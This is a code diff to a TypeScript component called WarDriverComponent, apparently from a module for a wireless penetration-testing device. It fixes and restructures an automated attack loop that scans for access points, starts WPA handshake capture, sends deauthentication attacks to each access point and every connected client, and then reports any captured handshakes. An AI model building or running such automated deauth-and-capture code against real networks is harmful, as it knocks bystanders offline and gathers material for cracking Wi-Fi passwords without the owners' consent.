@@ -226,7 +226,7 @@ export class WarDriverComponent implements OnInit {
                 multiplier: 5,
                 channel: 11
             }
-            const deauthBssidResp: any = await this.API.APIPostAsync('/api/pineap/deauth/ap', deauthClientPayload);
+            const deauthBssidResp: any = await this.API.APIPostAsync('/api/pineap/deauth/client', deauthClientPayload);
             return deauthBssidResp;
         }
 
@@ -277,26 +277,25 @@ export class WarDriverComponent implements OnInit {
                                 if (stopReconResponse.success) {
                                     getReconStatusById(scanID).then((reconScanResults) => {  // get recon scan results
                                         if (reconScanResults.APResults.length > 0) { // if we picked-up any APs
-                                            reconScanResults.APResults.forEach((ap) => { // loop through APs
+                                            reconScanResults.APResults.forEach((ap: APResult) => { // loop through APs
                                                 if (ap.clients != null) { // if any have clients
                                                     currentBssid = ap.bssid;
                                                     startHandshakeCapture(ap.bssid).then(() => { // start handshake
                                                         deauthBssid(ap);
-                                                        ap.clients.forEach((client) => { // loop through clients
+                                                        ap.clients.forEach((client: Client) => { // loop through clients
                                                             currentClient = client;
                                                             deauthClient(client);
-                                                        }).then(() => {
-                                                            setTimeout(() => {  // rest for 20 secs to collect lazy handshakes
-                                                                getHandshakeStatus().then((handShakeStatus) => { // check for handshakes
-                                                                    if (handShakeStatus.handshakes != null) {
-                                                                        sendNotification('Handshakes Found!'); // tell the user our results
-                                                                    }
-                                                                    else {
-                                                                        sendNotification('Sorry, no handshakes found :(');
-                                                                    }
-                                                                });
-                                                            }, 20000);
                                                         });
+                                                        setTimeout(() => {  // rest for 20 secs to collect lazy handshakes
+                                                            getHandshakeStatus().then((handShakeStatus) => { // check for handshakes
+                                                                if (handShakeStatus.handshakes != null) {
+                                                                    sendNotification('Handshakes Found!'); // tell the user our results
+                                                                }
+                                                                else {
+                                                                    sendNotification('Sorry, no handshakes found :(');
+                                                                }
+                                                            });
+                                                        }, 20000);
                                                     });
                                                 }
                                             });
